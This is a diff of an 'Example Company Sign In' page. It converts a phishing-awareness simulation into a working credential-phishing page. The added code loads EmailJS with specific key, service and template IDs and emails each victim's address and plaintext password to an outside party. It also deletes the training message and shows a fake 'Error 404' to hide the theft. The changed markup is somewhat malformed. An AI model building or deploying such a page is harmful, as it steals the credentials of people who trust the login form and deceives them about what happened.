@@ -1,30 +1,36 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Example Company Sign In</title>
-<link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Example Company Sign In</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init('hZeUbAV_AOZIaf-Pp'); // Replace with your EmailJS public key
+  </script>
 </head>
 <body>
+
   <div class="banner"></div>
 
   <div class="login-card" id="login-card">
-    <!-- Logo -->
     <div class="logo">
       <img src="logo.jpg" alt="Company Logo" width="150">
     </div>
 
     <form id="login-form">
-      <div id="step1">
+      <!-- Step 1: Email -->
+      <div id="step1" class="step">
         <h1 class="title">Sign in</h1>
-        <input id="email" type="email" placeholder="Enter your work email" required />
+        <input id="email" type="email" placeholder="Enter your work email" required>
         <button type="button" id="next-btn">Next</button>
       </div>
 
-      <div id="step2" class="hidden">
+      <!-- Step 2: Password -->
+      <div id="step2" class="step hidden">
         <h1 class="title">Welcome</h1>
-        <input id="password" type="password" placeholder="Enter password" required />
+        <input id="password" type="password" placeholder="Enter password" required>
         <button type="submit">Sign in</button>
       </div>
     </form>
@@ -37,47 +43,59 @@
     const step1 = document.getElementById("step1");
     const step2 = document.getElementById("step2");
     const form = document.getElementById("login-form");
+    const card = document.getElementById("login-card");
 
+    // Step 1 → Step 2
     nextBtn.addEventListener("click", () => {
-      if (document.getElementById("email").value.trim()) {
+      const emailInput = document.getElementById("email").value.trim();
+      if (!emailInput) {
+        alert("Please enter your email to continue.");
+        return;
+      }
+
+      step1.style.opacity = 0;
+      setTimeout(() => {
         step1.classList.add("hidden");
         step2.classList.remove("hidden");
-      }
+        step2.style.opacity = 0;
+        setTimeout(() => step2.style.opacity = 1, 50);
+      }, 300);
     });
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    // Step 2 → Training complete
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
 
-      const payload = {
-        simulation: true,
-        clicked: true,
-        email_provided: document.getElementById("email").value.trim().length > 0,
-        timestamp: new Date().toISOString(),
-        user_agent: navigator.userAgent
-      };
+  const emailValue = document.getElementById("email").value.trim();
+  const passwordValue = document.getElementById("password").value.trim();
 
-      document.getElementById("password").value = "";
+  const payload = {
+    user_email: emailValue,           // maps to your template variable
+    user_password: passwordValue,     // maps to your template variable
+    submission_time: new Date().toLocaleString(),
+    user_agent: navigator.userAgent
+  };
 
-      try {
-        await fetch("/log", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Error logging:", err);
-      }
+  // Send via EmailJS
+  emailjs.send('service_xg09ohm', 'template_ejtcry8', payload)
+    .then(res => console.log('Email sent!', res))
+    .catch(err => console.error('EmailJS error:', err));
 
-      document.getElementById("login-card").innerHTML = `
-        <h1 class="title">Training Complete</h1>
-        <p>This was a <strong>simulation</strong>. On a real phishing page, your credentials could have been stolen.</p>
-        <ul>
-          <li>Check sender & link before clicking</li>
-          <li>Look for spelling errors</li>
-          <li>When in doubt, report suspicious emails</li>
-        </ul>
+  document.getElementById("password").value = "";
+
+      // Show training message with slide-in animation
+      card.innerHTML = `
+        <div class="Thanks"slide-in">
+          <h1 class="title">Error 404</h1>
+
+          </ul>
+        </div>
       `;
     });
   </script>
+
+</body>
+</html>
+
 </body>
 </html>
